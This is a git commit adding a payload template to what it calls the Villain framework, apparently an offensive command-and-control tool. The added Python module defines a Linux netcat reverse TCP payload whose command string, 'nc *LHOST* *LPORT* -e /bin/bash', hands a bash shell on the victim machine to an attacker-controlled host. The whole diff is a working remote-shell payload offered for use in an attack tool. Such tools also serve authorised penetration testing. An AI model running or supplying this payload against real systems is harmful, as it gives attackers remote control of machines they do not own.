9e97f6a329c863f44004a020c0a985485768cd10
Platy <daryl.limkz@gmail.com>
2023-06-27 09:29:18 +0800

    feat: added netcat reverse tcp
    Signed-off-by: Platy <daryl.limkz@gmail.com>

---
+++ Core/payload_templates/linux/netcat/nc_reverse_tcp.py
@@ -0,0 +1,26 @@
+# This module is part of the Villain framework
+
+class Payload:
+
+    info = {
+        'Title' : 'Netcat exec reverse TCP',
+        'Author' : 'Unknown',
+        'Description' : 'Netcat execute reverse TCP',
+        'References' : ['https://revshells.com']
+    }
+
+    meta = {
+        'handler' : 'netcat',
+        'type' : 'nc-exec',
+        'os' : 'linux'  
+    }
+
+    config = {}
+
+    parameters = {
+        'lhost' : None
+    }
+
+    attrs = {}
+
+    data = "nc *LHOST* *LPORT* -e /bin/bash"
